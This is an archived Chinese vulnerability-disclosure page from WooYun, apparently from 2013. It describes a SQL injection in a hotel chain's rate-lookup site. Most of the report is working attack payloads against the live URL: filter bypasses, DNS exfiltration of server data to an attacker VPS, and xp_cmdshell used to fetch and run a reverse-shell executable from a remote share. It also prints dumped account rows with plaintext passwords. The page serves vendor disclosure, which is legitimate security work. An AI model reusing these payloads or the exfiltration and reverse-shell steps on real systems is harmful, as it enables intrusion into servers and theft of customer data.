@@ -1,0 +1,446 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		如家某处一个经典SQL注射  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		如家某处一个经典SQL注射  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/sql">sql</a> 
+</li><li>提交时间：		2013-11-30 01:11</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-21：	细节向普通白帽子公开<br/>
+									2013-12-31：	细节向实习白帽子公开<br/>
+									2014-01-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">rt</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">本吊昨天发现如家一个注入点，感觉这个点应该是被基友日过，然后被如家给补了。<br />
+<br />
+但是没补好，还是漏了一点点空给我。<br />
+<br />
+<br />
+<br />
+于是我想好好利用这个点，做点事情。<br />
+<br />
+<br />
+<br />
+既然是周末，那么本吊就不怕明天上课迟到了，先日站，再离线迅雷看片，然后大家都懂的。<br />
+<br />
+<br />
+<br />
+注入点是这个<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023<br />
+<br />
+<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039; and &#039;a&#039;=&#039;a<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039; and &#039;a&#039;=&#039;b<br />
+<br />
+明显的一个错误，一个正确。<br />
+<br />
+<br />
+<br />
+那么就是典型的字符型SQL注入。<br />
+<br />
+但是我用SQLMAP没跑出来。<br />
+<br />
+<br />
+<br />
+于是只好本吊亲自上阵了，很久没亲自操刀了，感觉很陌生得慌。<br />
+<br />
+<br />
+<br />
+因为是aspx 所以感觉是mssql<br />
+<br />
+就先执行了这个：<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039;and(select count(*) from sysobjects)&gt;0<br />
+<br />
+</p><p class="detail"><a href="../images/292356481ed307e572b6108eb5dd204538229f11.jpg" target="_blank"><img src="../images/292356481ed307e572b6108eb5dd204538229f11.jpg" alt="bb1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+警告！你的IP已经被记录!不要使用敏感字符！<br />
+<br />
+于是我知道了，过滤了select <br />
+<br />
+后来经测试，还过滤了 master declare等关键字。<br />
+<br />
+<br />
+<br />
+并且 令人蛋疼的是  错误提示关闭。没办法爆错显信息啊。<br />
+<br />
+<br />
+<br />
+大家肯定说那你openrowset吧。<br />
+<br />
+我也知道这么弄，可sqlserver 2005以上默认是关闭的。还是先判断数据库版本吧。<br />
+<br />
+<br />
+<br />
+执行<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039;and substring((select @@version),23,4)=&#039;2000&#039;and&#039;a&#039;=&#039;a<br />
+<br />
+返回错误。<br />
+<br />
+说明不是mssql2000<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039;substring((@@version),22,4)=&#039;2005&#039;and&#039;a&#039;=&#039;a<br />
+<br />
+这个也返回错误<br />
+<br />
+说明不是mssql2005<br />
+<br />
+<br />
+<br />
+后来检测到是mssql2008.<br />
+<br />
+<br />
+<br />
+然后检测一下权限。<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039; and IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00)=1 and &#039;a&#039;=&#039;a<br />
+<br />
+<br />
+<br />
+返回正常 <br />
+<br />
+<br />
+<br />
+竟然是sa。 我瞬间释然了。现在还能碰到sa啊   看来应该可以拿下了。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+现在就剩绕过ids了。<br />
+<br />
+<br />
+<br />
+经检测exec没有过滤，那么可以使用exec(sql语句的方式)<br />
+<br />
+<br />
+<br />
+exec(&#039;sel&#039;+&#039;ect @@version);这样就绕过IDS了。哈哈<br />
+<br />
+<br />
+<br />
+其实这里有个快速获取数据库信息的方法<br />
+<br />
+<br />
+<br />
+刚好 基友有个VPS 我们就试了一下。<br />
+<br />
+<br />
+<br />
+就是利用dns解析得到 想要的数据。<br />
+<br />
+执行<br />
+<br />
+<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039;exec(&#039;ba&#039;%2b&#039;ckup+lo&#039;%2b&#039;g+ma&#039;%2b&#039;ster+to+di&#039;%2b&#039;sk=&#039;&#039;\\&#039;%2b@@servername%2b&#039;.xxx.xxx\a&#039;&#039;;&#039;)--<br />
+<br />
+<br />
+<br />
+然后我再VPS监听 <br />
+<br />
+就得到@@servername的信息了。<br />
+<br />
+</p><p class="detail"><a href="../images/300947061b71ecfd0c9379252d9ae14586e2dd5f.jpg" target="_blank"><img src="../images/300947061b71ecfd0c9379252d9ae14586e2dd5f.jpg" alt="aaa.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+获取到是 ：R021RJSH00223S2<br />
+<br />
+<br />
+<br />
+通过这样的方法可以获取你想要的信息<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+不过这里既然是sa，那么 就不费劲了。<br />
+<br />
+直接用exec()的方式执行任何sql语句。<br />
+<br />
+<br />
+<br />
+恢复xp_cmshell<br />
+<br />
+然后直接反向链接程序，就弹回来了。<br />
+<br />
+<br />
+<br />
+这里我执行的是<br />
+<br />
+http://rates.homeinns.com/Mains.aspx?city=beijing@&amp;hotel=010023&#039;exec(&#039;ex&#039;%2b&#039;ec+ma&#039;%2b&#039;ster..x&#039;%2b&#039;p_cm&#039;%2b&#039;dshell&#039;&#039;\\1.1.1.1\pub\ma.exe&#039;&#039;&#039;)--<br />
+<br />
+<br />
+<br />
+直接把反弹程序放在vps就行了   <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+当然这里vps是配置共享服务，开放445什么的  大家都懂的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/3000113536a761ed12f89a5a5e70824fe0f615fc.jpg" target="_blank"><img src="../images/3000113536a761ed12f89a5a5e70824fe0f615fc.jpg" alt="aa1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这是弹回来的图。<br />
+<br />
+</p><p class="detail"><a href="../images/30001157c620183174165d1d5ddcbb60b17b7f4a.jpg" target="_blank"><img src="../images/30001157c620183174165d1d5ddcbb60b17b7f4a.jpg" alt="aa2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这是C盘，貌似有别人的马，看来被日过了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/30001228b4f1eb5752cb29222d69f83ae4111393.jpg" target="_blank"><img src="../images/30001228b4f1eb5752cb29222d69f83ae4111393.jpg" alt="aaa3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这是备份的数据库。<br />
+<br />
+<br />
+<br />
+然后我在cmd执行sql语句看下数据库的内容<br />
+<br />
+具体是这样的：<br />
+<br />
+osql /E /Q &quot;select @@version&quot;<br />
+<br />
+osql /E /Q &quot;select name from sysdatabases where dbid&gt;4&quot;<br />
+<br />
+这样可以直接在命令行执行sql语句的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/300012469da800b1b6422ac556eae2238e65c667.jpg" target="_blank"><img src="../images/300012469da800b1b6422ac556eae2238e65c667.jpg" alt="aaa4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这是其中一个表的内容<br />
+<br />
+<br />
+<br />
+D:\&gt;osql /E /Q &quot;use customer;select * from users&quot;<br />
+<br />
+osql /E /Q &quot;use customer;select * from users&quot;<br />
+<br />
+ ID          UserCode<br />
+<br />
+        UserName                                           UserPassword<br />
+<br />
+        UserEmail                                          RoleCode<br />
+<br />
+        Flag<br />
+<br />
+ ----------- --------------------<br />
+<br />
+        -------------------------------------------------- --------------<br />
+<br />
+        -------------------------------------------------- --------------<br />
+<br />
+        ----<br />
+<br />
+           3 1001<br />
+<br />
+        admin                                              111111<br />
+<br />
+                                                           1001<br />
+<br />
+           1<br />
+<br />
+           4 1002<br />
+<br />
+        ceshi                                              111111<br />
+<br />
+                                                           1002<br />
+<br />
+           1<br />
+<br />
+           5 1003<br />
+<br />
+        3333                                               111111<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+这是D盘：<br />
+<br />
+</p><p class="detail"><a href="../images/30001712eb382c72787201facd834ddaff299e30.jpg" target="_blank"><img src="../images/30001712eb382c72787201facd834ddaff299e30.jpg" alt="aa6666.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+其实呢，我已经有数据库服务器的管理员权限了<br />
+<br />
+<br />
+<br />
+可以轻松把所有数据库COPY到我的vps里面。<br />
+<br />
+也可以给数据库服务器装木马，干什么都行。<br />
+<br />
+<br />
+<br />
+所以就到此为止吧。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">同上<br />
+<br />
+（有个小错误修改了下，有一个图抹掉了漏点 ，求通过） </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">要补就不要留下空隙嘛。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/sql" title="sql">sql</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044473" title="如家某处一个经典SQL注射">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2013-12-01 22:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44473";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
